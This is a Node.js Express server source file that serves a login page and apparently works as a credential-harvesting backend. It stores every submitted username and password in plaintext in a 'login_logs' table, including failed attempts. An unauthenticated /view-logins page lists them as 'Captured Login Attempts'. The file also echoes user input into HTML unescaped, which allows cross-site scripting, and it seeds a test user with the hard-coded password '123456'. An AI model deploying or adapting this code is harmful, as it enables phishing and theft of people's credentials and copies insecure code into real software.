const express = require('express');
const bcrypt = require('bcrypt');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = 3000;

console.log("✅ server.js loaded");

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

// Database
const db = new sqlite3.Database('./users.db', (err) => {
  if (err) {
    console.error("❌ Failed to connect to DB:", err.message);
  } else {
    console.log("🗃️ Connected to SQLite database.");
  }
});

// Create users table
db.run(`CREATE TABLE IF NOT EXISTS users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT UNIQUE,
  password TEXT
)`);

// Create login_logs table to log all entries from index.html
db.run(`CREATE TABLE IF NOT EXISTS login_logs (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT,
  password TEXT,
  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
)`);

// Serve login page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Handle login + log attempt
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // Log every login attempt (even wrong ones)
  db.run(`INSERT INTO login_logs (username, password) VALUES (?, ?)`, [username, password], (err) => {
    if (err) console.error("❌ Failed to log login attempt:", err.message);
  });

  // Check credentials
  db.get(`SELECT * FROM users WHERE username = ?`, [username], async (err, row) => {
    if (err) {
      console.error("DB Error:", err.message);
      return res.redirect('/legal.html');
    }

    if (!row) return res.redirect('/legal.html');

    const match = await bcrypt.compare(password, row.password);
    if (match) {
      res.send(`<h1>✅ Login Successful</h1><p>Welcome, ${username}!</p>`);
    } else {
      res.redirect('/legal.html');
    }
  });
});

// Create a test user: /create-test-user
app.get('/create-test-user', async (req, res) => {
  const hashedPassword = await bcrypt.hash('123456', 10);
  db.run(`INSERT INTO users (username, password) VALUES (?, ?)`, ['testuser', hashedPassword], (err) => {
    if (err) return res.send('User already exists.');
    res.send('✅ Test user created. Username: testuser, Password: 123456');
  });
});

// View captured login attempts: /view-logins
app.get('/view-logins', (req, res) => {
  db.all('SELECT * FROM login_logs ORDER BY timestamp DESC', [], (err, rows) => {
    if (err) return res.send('Error loading login logs.');

    let html = '<h2>Captured Login Attempts</h2><ul>';
    rows.forEach(row => {
      html += `<li><strong>${row.username}</strong> | ${row.password} | ${row.timestamp}</li>`;
    });
    html += '</ul>';
    res.send(html);
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});
